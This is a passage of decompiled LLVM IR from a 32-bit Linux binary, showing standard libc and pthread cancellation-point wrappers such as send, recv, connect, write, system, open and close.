  %v3_804cc8f = and i32 %v2_804cc8f, -256
  %v4_804cc8f = or i32 %v3_804cc8f, %v1_804cc8f
  store i32 %v4_804cc8f, i32* @edx, align 4
  %v4_804cc92 = icmp eq i1 %v15_804cc8b, false
  br i1 %v4_804cc92, label %dec_label_pc_804cc65, label %dec_label_pc_804cc96

dec_label_pc_804cc96:                             ; preds = %dec_label_pc_804cc80
  br i1 %v1_804cc6c, label %dec_label_pc_804ccbf, label %dec_label_pc_804cc9a

dec_label_pc_804cc9a:                             ; preds = %dec_label_pc_804cc96
  %v0_804cc9a = load i32, i32* @edi, align 4
  %v0_804cca0 = load i32, i32* @ebp, align 4
  store i32 %v0_804cca0, i32* %stack_var_-44, align 4
  %v3_804cca1 = inttoptr i32 %v0_804cc9a to i32*
  %v4_804cca1 = call i32 @__pthread_timedsuspend_new(i32 %arg3, i32* %v3_804cca1, i32 %v0_804cc9a)
  %v1_804cca9 = icmp eq i32 %v4_804cca1, 0
  %v1_804ccab = icmp eq i1 %v1_804cca9, false
  br i1 %v1_804ccab, label %dec_label_pc_804ccbf, label %dec_label_pc_804ccad

dec_label_pc_804ccad:                             ; preds = %dec_label_pc_804cc9a
  %v1_804ccad = and i32 %v4_804cca1, -256
  %v2_804ccad = or i32 %v1_804ccad, 1
  %v0_804ccaf = load i32, i32* @esi, align 4
  %v1_804ccaf = add i32 %v0_804ccaf, 8
  %v2_804ccaf = inttoptr i32 %v1_804ccaf to i32*
  %v3_804ccaf = load i32, i32* %v2_804ccaf, align 4
  store i32 %v2_804ccad, i32* %v2_804ccaf, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_804ccb4 = icmp eq i32 %v3_804ccaf, 0
  br i1 %v1_804ccb4, label %dec_label_pc_804cccb, label %dec_label_pc_804ccb8

dec_label_pc_804ccb8:                             ; preds = %dec_label_pc_804ccad
  %v0_804ccb8 = load i32, i32* @ebp, align 4
  store i32 %v0_804ccb8, i32* @eax, align 4
  %v0_804ccba = load i32, i32* %stack_var_-44, align 4
  %v2_804ccba = call i32 @suspend.5(i32 %v0_804ccba, i32 %arg3)
  br label %dec_label_pc_804ccbf

dec_label_pc_804ccbf:                             ; preds = %dec_label_pc_804cc9a, %dec_label_pc_804cc96, %dec_label_pc_804ccb8
  %v0_804ccbf = load i32, i32* @esi, align 4
  store i32 %v0_804ccbf, i32* @eax, align 4
  %v0_804ccc1 = call i32 @wait_node_free()
  store i32 1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804cccb

dec_label_pc_804cccb:                             ; preds = %dec_label_pc_804ccad, %dec_label_pc_804cc52, %dec_label_pc_804ccbf
  %v0_804ccce = phi i32 [ 0, %dec_label_pc_804ccad ], [ 1, %dec_label_pc_804cc52 ], [ 1, %dec_label_pc_804ccbf ]
  store i32 %v0_804cc07, i32* @ebx, align 4
  store i32 %v0_804cc06, i32* @esi, align 4
  ret i32 %v0_804ccce

; uselistorder directives
  uselistorder i1 %v15_804cc8b, { 1, 2, 0 }
  uselistorder i32 %v2_804cc8b, { 1, 0 }
  uselistorder i32 %v1_804cc44, { 0, 1, 3, 2 }
  uselistorder i32 %v0_804cc1f, { 1, 0, 2 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 3, 4, 2, 5, 6 }
  uselistorder i32 ()* @wait_node_free, { 1, 0 }
  uselistorder i32 (i32, i32)* @suspend.5, { 3, 1, 0, 2 }
  uselistorder i32 ()* @thread_self.4, { 2, 0, 1 }
  uselistorder i32 (i32)* @__pthread_acquire, { 1, 0 }
  uselistorder i32* @global_var_8062fe8.173, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804cccb, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ccbf, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804cc80, { 1, 0 }
  uselistorder label %dec_label_pc_804cc7b, { 1, 0 }
  uselistorder label %dec_label_pc_804cc65, { 3, 1, 2, 0 }
}

define i32 @sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ccd8 = load i32, i32* @ebx, align 4
  store i32 %v0_804ccd8, i32* %stack_var_-4, align 4
  %v2_804ccdc = ptrtoint i32* %stack_var_-8 to i32
  %v3_804cce3 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804ccdc)
  %v6_804cd02 = call i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6)
  store i32 %v6_804cd02, i32* @ebx, align 4
  %v3_804cd0e = load i32, i32* %stack_var_-8, align 4
  %v2_804cd12 = trunc i32 %v3_804cd0e to i8
  %v3_804cd12 = call i32 @__GI_pthread_setcanceltype(i8 %v2_804cd12, i32 0)
  %v0_804cd17 = load i32, i32* @ebx, align 4
  %v2_804cd1c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804cd1c, i32* @ebx, align 4
  ret i32 %v0_804cd17
}

define i32 @sendmsg(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_804cd22 = ptrtoint i32* %stack_var_-8 to i32
  %v3_804cd29 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804cd22)
  %v3_804cd3d = call i32 @__libc_sendmsg(i32 %arg1, i32 %arg2, i32 %arg3)
  store i32 %arg1, i32* @ecx, align 4
  store i32 %v3_804cd3d, i32* @ebx, align 4
  %v3_804cd48 = load i32, i32* %stack_var_-8, align 4
  %v2_804cd4c = trunc i32 %v3_804cd48 to i8
  %v3_804cd4c = call i32 @__GI_pthread_setcanceltype(i8 %v2_804cd4c, i32 0)
  %v0_804cd51 = load i32, i32* @ebx, align 4
  ret i32 %v0_804cd51
}

define i32 @send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_804cd5c = ptrtoint i32* %stack_var_-8 to i32
  %v3_804cd63 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804cd5c)
  %v4_804cd78 = call i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  store i32 %v4_804cd78, i32* @ebx, align 4
  %v3_804cd84 = load i32, i32* %stack_var_-8, align 4
  %v2_804cd88 = trunc i32 %v3_804cd84 to i8
  %v3_804cd88 = call i32 @__GI_pthread_setcanceltype(i8 %v2_804cd88, i32 0)
  %v0_804cd8d = load i32, i32* @ebx, align 4
  ret i32 %v0_804cd8d
}

define i32 @recvmsg(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_804cd98 = ptrtoint i32* %stack_var_-8 to i32
  %v3_804cd9f = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804cd98)
  %v3_804cdb3 = call i32 @__libc_recvmsg(i32 %arg1, i32 %arg2, i32 %arg3)
  store i32 %v3_804cdb3, i32* @ebx, align 4
  %v3_804cdbe = load i32, i32* %stack_var_-8, align 4
  %v2_804cdc2 = trunc i32 %v3_804cdbe to i8
  %v3_804cdc2 = call i32 @__GI_pthread_setcanceltype(i8 %v2_804cdc2, i32 0)
  %v0_804cdc7 = load i32, i32* @ebx, align 4
  ret i32 %v0_804cdc7
}

define i32 @recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_804cdd2 = ptrtoint i32* %stack_var_-8 to i32
  %v3_804cdd9 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804cdd2)
  store i32 %v2_804cdd2, i32* @ebx, align 4
  %v6_804cdf8 = call i32 @__libc_recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6)
  store i32 %v6_804cdf8, i32* @ebx, align 4
  %v3_804ce04 = load i32, i32* %stack_var_-8, align 4
  %v2_804ce08 = trunc i32 %v3_804ce04 to i8
  %v3_804ce08 = call i32 @__GI_pthread_setcanceltype(i8 %v2_804ce08, i32 0)
  %v0_804ce0d = load i32, i32* @ebx, align 4
  ret i32 %v0_804ce0d
}

define i32 @recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ce14 = load i32, i32* @ebx, align 4
  store i32 %v0_804ce14, i32* %stack_var_-4, align 4
  %v2_804ce18 = ptrtoint i32* %stack_var_-8 to i32
  %v3_804ce1f = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804ce18)
  %v4_804ce34 = call i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  store i32 %v4_804ce34, i32* @ebx, align 4
  %v3_804ce40 = load i32, i32* %stack_var_-8, align 4
  %v2_804ce44 = trunc i32 %v3_804ce40 to i8
  %v3_804ce44 = call i32 @__GI_pthread_setcanceltype(i8 %v2_804ce44, i32 0)
  %v0_804ce49 = load i32, i32* @ebx, align 4
  %v2_804ce4e = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804ce4e, i32* @ebx, align 4
  ret i32 %v0_804ce49
}

define i32 @connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ce50 = load i32, i32* @ebx, align 4
  store i32 %v0_804ce50, i32* %stack_var_-4, align 4
  %v2_804ce54 = ptrtoint i32* %stack_var_-8 to i32
  %v3_804ce5b = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804ce54)
  %v3_804ce6f = call i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3)
  store i32 %v3_804ce6f, i32* @ebx, align 4
  %v3_804ce7a = load i32, i32* %stack_var_-8, align 4
  %v2_804ce7e = trunc i32 %v3_804ce7a to i8
  %v3_804ce7e = call i32 @__GI_pthread_setcanceltype(i8 %v2_804ce7e, i32 0)
  %v0_804ce83 = load i32, i32* @ebx, align 4
  %v2_804ce88 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804ce88, i32* @ebx, align 4
  ret i32 %v0_804ce83
}

define i32 @accept(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ce8a = load i32, i32* @ebx, align 4
  store i32 %v0_804ce8a, i32* %stack_var_-4, align 4
  %v2_804ce8e = ptrtoint i32* %stack_var_-8 to i32
  %v3_804ce95 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804ce8e)
  %v3_804cea9 = call i32 @__libc_accept(i32 %arg1, i32 %arg2, i32 %arg3)
  store i32 %arg1, i32* @ecx, align 4
  store i32 %v3_804cea9, i32* @ebx, align 4
  %v3_804ceb4 = load i32, i32* %stack_var_-8, align 4
  %v2_804ceb8 = trunc i32 %v3_804ceb4 to i8
  %v3_804ceb8 = call i32 @__GI_pthread_setcanceltype(i8 %v2_804ceb8, i32 0)
  %v0_804cebd = load i32, i32* @ebx, align 4
  %v2_804cec2 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804cec2, i32* @ebx, align 4
  ret i32 %v0_804cebd
}

define i32 @write(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804cec4 = load i32, i32* @ebx, align 4
  store i32 %v0_804cec4, i32* %stack_var_-4, align 4
  %v2_804cec8 = ptrtoint i32* %stack_var_-8 to i32
  %v3_804cecf = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804cec8)
  %v3_804cee3 = call i32 @__libc_write(i32 %arg1, i32 %arg2, i32 %arg3)
  store i32 %v3_804cee3, i32* @ebx, align 4
  %v3_804ceee = load i32, i32* %stack_var_-8, align 4
  %v2_804cef2 = trunc i32 %v3_804ceee to i8
  %v3_804cef2 = call i32 @__GI_pthread_setcanceltype(i8 %v2_804cef2, i32 0)
  %v0_804cef7 = load i32, i32* @ebx, align 4
  %v2_804cefc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804cefc, i32* @ebx, align 4
  ret i32 %v0_804cef7
}

define i32 @waitpid(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804cefe = load i32, i32* @ebx, align 4
  store i32 %v0_804cefe, i32* %stack_var_-4, align 4
  %v2_804cf02 = ptrtoint i32* %stack_var_-8 to i32
  %v3_804cf09 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804cf02)
  %v3_804cf1d = call i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3)
  store i32 %arg1, i32* @ecx, align 4
  store i32 %v3_804cf1d, i32* @ebx, align 4
  %v3_804cf28 = load i32, i32* %stack_var_-8, align 4
  %v2_804cf2c = trunc i32 %v3_804cf28 to i8
  %v3_804cf2c = call i32 @__GI_pthread_setcanceltype(i8 %v2_804cf2c, i32 0)
  %v0_804cf31 = load i32, i32* @ebx, align 4
  %v2_804cf36 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804cf36, i32* @ebx, align 4
  ret i32 %v0_804cf31
}

define i32 @wait(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_804cf3c = ptrtoint i32* %stack_var_-8 to i32
  %v3_804cf43 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804cf3c)
  %v1_804cf4d = call i32 @__libc_wait(i32 %arg1)
  store i32 %v1_804cf4d, i32* @ebx, align 4
  %v3_804cf58 = load i32, i32* %stack_var_-8, align 4
  %v2_804cf5c = trunc i32 %v3_804cf58 to i8
  %v3_804cf5c = call i32 @__GI_pthread_setcanceltype(i8 %v2_804cf5c, i32 0)
  %v0_804cf61 = load i32, i32* @ebx, align 4
  ret i32 %v0_804cf61
}

define i32 @tcdrain(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_804cf6c = ptrtoint i32* %stack_var_-8 to i32
  %v3_804cf73 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804cf6c)
  %v1_804cf7d = call i32 @__libc_tcdrain(i32 %arg1)
  store i32 %v1_804cf7d, i32* @ebx, align 4
  %v3_804cf88 = load i32, i32* %stack_var_-8, align 4
  %v2_804cf8c = trunc i32 %v3_804cf88 to i8
  %v3_804cf8c = call i32 @__GI_pthread_setcanceltype(i8 %v2_804cf8c, i32 0)
  %v0_804cf91 = load i32, i32* @ebx, align 4
  ret i32 %v0_804cf91
}

define i32 @system(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_804cf9c = ptrtoint i32* %stack_var_-8 to i32
  %v3_804cfa3 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804cf9c)
  store i32 1, i32* @ecx, align 4
  %v1_804cfad = call i32 @__libc_system(i32 %arg1)
  store i32 %v1_804cfad, i32* @ebx, align 4
  %v3_804cfb8 = load i32, i32* %stack_var_-8, align 4
  %v2_804cfbc = trunc i32 %v3_804cfb8 to i8
  %v3_804cfbc = call i32 @__GI_pthread_setcanceltype(i8 %v2_804cfbc, i32 0)
  %v0_804cfc1 = load i32, i32* @ebx, align 4
  ret i32 %v0_804cfc1
}

define i32 @read(i32 %arg1) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v2_804cfcc = ptrtoint i32* %stack_var_-8 to i32
  %v3_804cfd3 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804cfcc)
  %v3_804cfe7 = call i32 @__libc_read(i32 %arg1, i32 %tmp1, i32 %tmp2)
  store i32 %v3_804cfe7, i32* @ebx, align 4
  %v3_804cff2 = load i32, i32* %stack_var_-8, align 4
  %v2_804cff6 = trunc i32 %v3_804cff2 to i8
  %v3_804cff6 = call i32 @__GI_pthread_setcanceltype(i8 %v2_804cff6, i32 0)
  %v0_804cffb = load i32, i32* @ebx, align 4
  ret i32 %v0_804cffb
}

define i32 @pwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_804d006 = ptrtoint i32* %stack_var_-8 to i32
  %v3_804d00d = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804d006)
  %v4_804d022 = call i32 @__libc_pwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  store i32 %v4_804d022, i32* @ebx, align 4
  %v3_804d02e = load i32, i32* %stack_var_-8, align 4
  %v2_804d032 = trunc i32 %v3_804d02e to i8
  %v3_804d032 = call i32 @__GI_pthread_setcanceltype(i8 %v2_804d032, i32 0)
  %v0_804d037 = load i32, i32* @ebx, align 4
  ret i32 %v0_804d037
}

define i32 @pread64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_804d043 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %arg5, i32* @esi, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v3_804d052 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804d043)
  %v0_804d057 = load i32, i32* @esi, align 4
  %v0_804d05a = load i32, i32* @ebx, align 4
  %v5_804d067 = call i32 @__libc_pread64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v0_804d05a, i32 %v0_804d057)
  store i32 %v5_804d067, i32* @ebx, align 4
  %v3_804d073 = load i32, i32* %stack_var_-12, align 4
  %v2_804d077 = trunc i32 %v3_804d073 to i8
  %v3_804d077 = call i32 @__GI_pthread_setcanceltype(i8 %v2_804d077, i32 0)
  %v0_804d07c = load i32, i32* @ebx, align 4
  ret i32 %v0_804d07c
}

define i32 @pread(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_804d088 = ptrtoint i32* %stack_var_-8 to i32
  %v3_804d08f = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804d088)
  %v4_804d0a4 = call i32 @__libc_pread(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  store i32 %v4_804d0a4, i32* @ebx, align 4
  %v3_804d0b0 = load i32, i32* %stack_var_-8, align 4
  %v2_804d0b4 = trunc i32 %v3_804d0b0 to i8
  %v3_804d0b4 = call i32 @__GI_pthread_setcanceltype(i8 %v2_804d0b4, i32 0)
  %v0_804d0b9 = load i32, i32* @ebx, align 4
  ret i32 %v0_804d0b9
}

define i32 @pause(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_804d0c4 = ptrtoint i32* %stack_var_-8 to i32
  %v3_804d0cb = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804d0c4)
  %v0_804d0d0 = call i32 @__libc_pause()
  store i32 1, i32* @ecx, align 4
  store i32 %v0_804d0d0, i32* @ebx, align 4
  %v3_804d0db = load i32, i32* %stack_var_-8, align 4
  %v2_804d0df = trunc i32 %v3_804d0db to i8
  %v3_804d0df = call i32 @__GI_pthread_setcanceltype(i8 %v2_804d0df, i32 0)
  %v0_804d0e4 = load i32, i32* @ebx, align 4
  ret i32 %v0_804d0e4
}

define i32 @open64(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_804d0ef = ptrtoint i32* %stack_var_-8 to i32
  %v3_804d0f6 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804d0ef)
  %v3_804d112 = trunc i32 %arg2 to i8
  %v4_804d112 = call i32 @__GI___libc_open64(i32 %arg1, i8 %v3_804d112, i32 %arg3)
  store i32 %v4_804d112, i32* @ebx, align 4
  %v3_804d11d = load i32, i32* %stack_var_-8, align 4
  %v2_804d121 = trunc i32 %v3_804d11d to i8
  %v3_804d121 = call i32 @__GI_pthread_setcanceltype(i8 %v2_804d121, i32 0)
  %v0_804d126 = load i32, i32* @ebx, align 4
  ret i32 %v0_804d126
}

define i32 @open(i32 %arg1) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v2_804d131 = ptrtoint i32* %stack_var_-8 to i32
  %v3_804d138 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804d131)
  %v3_804d154 = trunc i32 %tmp1 to i8
  %v4_804d154 = call i32 @__libc_open(i32 %arg1, i8 %v3_804d154, i32 %tmp2)
  store i32 %arg1, i32* @ecx, align 4
  store i32 %v4_804d154, i32* @ebx, align 4
  %v3_804d15f = load i32, i32* %stack_var_-8, align 4
  %v2_804d163 = trunc i32 %v3_804d15f to i8
  %v3_804d163 = call i32 @__GI_pthread_setcanceltype(i8 %v2_804d163, i32 0)
  %v0_804d168 = load i32, i32* @ebx, align 4
  ret i32 %v0_804d168
}

define i32 @nanosleep(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804d16f = load i32, i32* @ebx, align 4
  store i32 %v0_804d16f, i32* %stack_var_-4, align 4
  %v2_804d173 = ptrtoint i32* %stack_var_-8 to i32
  %v3_804d17a = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804d173)
  store i32 %v2_804d173, i32* @ebx, align 4
  %v2_804d189 = call i32 @__libc_nanosleep(i32 %arg1, i32 %arg2)
  store i32 %v2_804d189, i32* @ebx, align 4
  %v3_804d194 = load i32, i32* %stack_var_-8, align 4
  %v2_804d198 = trunc i32 %v3_804d194 to i8
  %v3_804d198 = call i32 @__GI_pthread_setcanceltype(i8 %v2_804d198, i32 0)
  %v0_804d19d = load i32, i32* @ebx, align 4
  %v2_804d1a2 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d1a2, i32* @ebx, align 4
  ret i32 %v0_804d19d
}

define i32 @msync(i32 %arg1) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v2_804d1a8 = ptrtoint i32* %stack_var_-8 to i32
  %v3_804d1af = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804d1a8)
  %v3_804d1c3 = call i32 @__libc_msync(i32 %arg1, i32 %tmp1, i32 %tmp2)
  store i32 %v3_804d1c3, i32* @ebx, align 4
  %v3_804d1ce = load i32, i32* %stack_var_-8, align 4
  %v2_804d1d2 = trunc i32 %v3_804d1ce to i8
  %v3_804d1d2 = call i32 @__GI_pthread_setcanceltype(i8 %v2_804d1d2, i32 0)
  %v0_804d1d7 = load i32, i32* @ebx, align 4
  ret i32 %v0_804d1d7
}

define i32 @lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_804d1e3 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %arg2, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v3_804d1f2 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804d1e3)
  %v0_804d1fb = load i32, i32* @esi, align 4
  %v0_804d1fc = load i32, i32* @ebx, align 4
  %v4_804d201 = call i32 @__libc_lseek64(i32 %arg1, i32 %v0_804d1fc, i32 %v0_804d1fb, i32 %arg4)
  store i32 %v4_804d201, i32* @ebx, align 4
  %v3_804d20d = load i32, i32* %stack_var_-12, align 4
  %v0_804d211 = load i32, i32* @edx, align 4
  store i32 %v0_804d211, i32* @esi, align 4
  %v2_804d213 = trunc i32 %v3_804d20d to i8
  %v3_804d213 = call i32 @__GI_pthread_setcanceltype(i8 %v2_804d213, i32 0)
  %v0_804d218 = load i32, i32* @ebx, align 4
  ret i32 %v0_804d218
}

define i32 @lseek(i32 %arg1) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v2_804d226 = ptrtoint i32* %stack_var_-8 to i32
  %v3_804d22d = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804d226)
  %v3_804d241 = call i32 @__GI___libc_lseek(i32 %arg1, i32 %tmp1, i32 %tmp2)
  store i32 %arg1, i32* @ecx, align 4
  store i32 %v3_804d241, i32* @ebx, align 4
  %v3_804d24c = load i32, i32* %stack_var_-8, align 4
  %v2_804d250 = trunc i32 %v3_804d24c to i8
  %v3_804d250 = call i32 @__GI_pthread_setcanceltype(i8 %v2_804d250, i32 0)
  %v0_804d255 = load i32, i32* @ebx, align 4
  ret i32 %v0_804d255
}

define i32 @fsync(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_804d260 = ptrtoint i32* %stack_var_-8 to i32
  %v3_804d267 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804d260)
  store i32 1, i32* @ecx, align 4
  %v1_804d271 = call i32 @__libc_fsync(i32 %arg1)
  store i32 %v1_804d271, i32* @ebx, align 4
  %v3_804d27c = load i32, i32* %stack_var_-8, align 4
  %v2_804d280 = trunc i32 %v3_804d27c to i8
  %v3_804d280 = call i32 @__GI_pthread_setcanceltype(i8 %v2_804d280, i32 0)
  %v0_804d285 = load i32, i32* @ebx, align 4
  ret i32 %v0_804d285
}

define i32 @fcntl(i32 %arg1) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v2_804d290 = ptrtoint i32* %stack_var_-8 to i32
  %v3_804d297 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804d290)
  %v3_804d2b3 = call i32 @__libc_fcntl(i32 %arg1, i32 %tmp1, i32 %tmp2)
  store i32 %v3_804d2b3, i32* @ebx, align 4
  %v3_804d2be = load i32, i32* %stack_var_-8, align 4
  %v2_804d2c2 = trunc i32 %v3_804d2be to i8
  %v3_804d2c2 = call i32 @__GI_pthread_setcanceltype(i8 %v2_804d2c2, i32 0)
  %v0_804d2c7 = load i32, i32* @ebx, align 4
  ret i32 %v0_804d2c7
}

define i32 @close(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804d2ce = load i32, i32* @ebx, align 4
  store i32 %v0_804d2ce, i32* %stack_var_-4, align 4
  %v2_804d2d2 = ptrtoint i32* %stack_var_-8 to i32
  %v3_804d2d9 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_804d2d2)
  %v1_804d2e3 = call i32 @__libc_close(i32 %arg1)
  store i32 %arg1, i32* @ecx, align 4
  store i32 %v1_804d2e3, i32* @ebx, align 4
  %v3_804d2ee = load i32, i32* %stack_var_-8, align 4
  %v2_804d2f2 = trunc i32 %v3_804d2ee to i8
  %v3_804d2f2 = call i32 @__GI_pthread_setcanceltype(i8 %v2_804d2f2, i32 0)
  %v0_804d2f7 = load i32, i32* @ebx, align 4
  %v2_804d2fc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d2fc, i32* @ebx, align 4
  ret i32 %v0_804d2f7

; uselistorder directives
  uselistorder i32 (i8, i32)* @__GI_pthread_setcanceltype, { 44, 45, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 52, 53, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 38, 39, 50, 51, 46, 47, 42, 43, 48, 49, 30, 31, 32, 33, 34, 35, 36, 37, 40, 41 }
}

define i32 @__libc_current_sigrtmin() local_unnamed_addr {
entry:
  %v0_804d300 = load i32, i32* @global_var_80627b8.175, align 8
  ret i32 %v0_804d300
}

define i32 @__libc_current_sigrtmax() local_unnamed_addr {
entry:
  %v0_804d306 = load i32, i32* @global_var_80627bc.176, align 4
  ret i32 %v0_804d306
}

define i32 @__libc_allocate_rtsig(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804d30c = load i32, i32* @global_var_80627b8.175, align 8
  %v1_804d312 = add i32 %v0_804d30c, 1
  %v10_804d312 = icmp eq i32 %v1_804d312, 0
  br i1 %v10_804d312, label %dec_label_pc_804d33e, label %dec_label_pc_804d317

dec_label_pc_804d317:                             ; preds = %entry
  %v0_804d317 = load i32, i32* @global_var_80627bc.176, align 4
  %v8_804d31f = icmp sgt i32 %v0_804d30c, %v0_804d317
  br i1 %v8_804d31f, label %dec_label_pc_804d33e, label %dec_label_pc_804d321

dec_label_pc_804d321:                             ; preds = %dec_label_pc_804d317
  %v4_804d321 = icmp eq i32 %arg1, 0
  br i1 %v4_804d321, label %dec_label_pc_804d332, label %dec_label_pc_804d328

dec_label_pc_804d328:                             ; preds = %dec_label_pc_804d321
  store i32 %v1_804d312, i32* @global_var_80627b8.175, align 8
  br label %dec_label_pc_804d341

dec_label_pc_804d332:                             ; preds = %dec_label_pc_804d321
